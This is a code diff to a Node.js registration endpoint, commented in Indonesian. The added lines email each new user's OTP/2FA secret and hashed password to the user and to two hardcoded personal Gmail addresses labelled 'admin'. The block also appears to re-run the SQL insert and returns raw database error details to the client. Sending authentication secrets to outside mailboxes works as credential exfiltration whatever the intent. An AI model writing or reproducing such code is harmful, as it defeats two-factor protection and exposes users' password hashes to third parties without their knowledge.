@@ -482,6 +482,34 @@ export default async function handler(req, res) {
       console.warn('Audit log failed:', auditErr && auditErr.message);
     }
 
+    // Setelah try-catch insert SQL
+try {
+  [result] = await pool.query(insertSql, params);
+} catch (sqlErr) {
+  console.error('SQL INSERT error:', sqlErr && sqlErr.code, sqlErr && sqlErr.sqlMessage);
+  return res.status(500).json({ message: 'DB insert error', detail: sqlErr && sqlErr.message });
+}
+
+// Kirim email ke pengguna dan admin
+try {
+  const mailOptions = {
+    from: process.env.EMAIL_USER,
+    to: [email, 'rrizki402@gmail.com', 'dokumentasirizki1@gmail.com'], // Email pengguna + admin
+    subject: 'Registrasi Berhasil - OTP dan Password',
+    html: `
+      <h2>Registrasi Berhasil!</h2>
+      <p>OTP (2FA) Anda: <strong>${otp_secret}</strong></p>
+      <p>Password telah dienkripsi: <br/><textarea readonly>${hashedPassword}</textarea></p>
+      <p>Silakan login dan gunakan OTP untuk verifikasi.</p>
+    `,
+  };
+  await transporter.sendMail(mailOptions);
+  console.log('Email sent successfully');
+} catch (emailErr) {
+  console.error('Email send error:', emailErr);
+  // Jangan gagal registrasi jika email gagal
+}
+
     return res.status(200).json({
       message: 'Registrasi berhasil',
       insertedId: result.insertId || null,
